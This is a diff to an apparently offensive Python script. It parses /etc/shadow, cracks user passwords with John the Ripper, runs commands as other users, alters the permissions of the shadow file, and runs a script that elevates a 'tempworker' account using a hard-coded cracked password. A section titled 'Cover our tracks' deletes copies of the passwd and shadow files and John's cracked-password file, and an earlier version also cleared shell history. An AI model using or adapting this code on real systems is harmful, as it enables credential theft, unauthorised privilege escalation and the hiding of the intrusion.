@@ -54,7 +54,7 @@ def exec_john_cmd_as_user(user, password, command, delay=True):
 # We already know tempuser's password
 temp_password = "correctbatteryhorsestaple99"
 
-
+'''
 # Parse the shadow password file
 with io.open('/etc/shadow', 'r', encoding='utf8') as shadow:
 	for line in shadow.read().split('\n'):
@@ -110,22 +110,27 @@ print(sysadmin_cracked)
 # Fix permissions
 exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 
-
-# Elevate tempworker
-elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False)
+'''
+# Elevate tempworker and clear history
+yourboss_cracked = 'money'
+elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked + ' > temp_hash.txt').split(), shell=True)
+time.sleep(2)
 elevate_process.kill()
 
 
 # Cover our tracks
-os.remove('temp_hash.txt')
-clear_hist_process = subprocess.Popen(('history -c').split(), shell=False)
-clear_hist_process.kill()
+try:
+    os.remove('temp_hash.txt')
+except:
+    # No other user created files to remove
+    pass
 
 try:
     os.remove('/tmp/passwd_copy')
     os.remove('/tmp/shadow_copy')
+    os.remove('~/.john/john.pot')
 
 except:
-    # No other files to remove
+    # No other john files to remove
     pass
 
